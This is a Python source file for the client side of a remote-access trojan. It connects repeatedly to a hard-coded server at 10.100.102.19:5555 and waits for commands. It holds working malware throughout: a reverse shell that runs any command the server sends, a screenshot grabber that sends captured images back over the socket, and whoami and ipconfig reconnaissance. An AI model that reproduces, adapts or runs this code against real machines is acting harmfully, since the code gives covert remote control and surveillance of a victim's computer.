from socket import *
import os
from time import sleep
from subprocess import getoutput
import random
import pyautogui

BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"
isConncted = False


def string_check(data):  # This checks if the os can run this command
    string = str(data).strip()
    if len(string) == 0:
        return "error"
    else:
        return string


def reverse_shell(client):  # Returns revese shell to server
    SEPARATOR = "\n"
    cwd = "(To exit type 'quit')\n"+os.getcwd() + ">"
    client.sendall(cwd.encode())
    while True:
        # receive the command from the server
        command = client.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "quit":
            # if the command is quit, just break out of the loop
            break
        if splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            try:
                output = getoutput(command)
            except Exception as e:
                output = "Command is Invalid" + e
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}>"
        client.sendall(message.encode())


def screenshot(client):  # Takes screenshot of PC and send it to server
    try:
        name = random.randint(0, 100000)
        filename = f"TEMP\{name}.jpg"
        im = pyautogui.screenshot()
        im.save(filename)
        client.sendall(filename.encode())
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)  # Reads the bytes from the file
                if not bytes_read:
                    sleep(1)
                    client.sendall(b"11111111")
                    break
                client.sendall(bytes_read)
    except Exception as e:
        print("Error")


def start_client():  # Start the client side and all the communication is here.
    global isConncted
    try:
        while True:
            command = client.recv(BUFFER_SIZE).decode()
            if command == "exit":
                client.close()
                print("Server disconnected")
                break
            elif command == "reverse_shell":
                reverse_shell(client)
            elif command == "ipconfig":
                output = os.popen(command).read()
                output = string_check(output)
                client.sendall(output.encode())
            elif command == "whoami":
                output = os.popen(command).read()
                output = string_check(output)
                client.sendall(output.encode())
            elif command == "screenshot":
                screenshot(client)
            elif command == "alive?":
                client.sendall("yes".encode())
            else:
                client.sendall("Invalid Command".encode())

    except Exception as e:
        isConncted = False
        client.close
        print(f"Server disconnected!")
        sleep(1)


while True:
    if(isConncted == False):
        try:
            client = socket(AF_INET, SOCK_STREAM)
            client.connect(("10.100.102.19", 5555))
            isConncted = True
            print("Conncted to Server!")
            start_client()  # Starts client
        except Exception as e:
            print("Wating for server..")
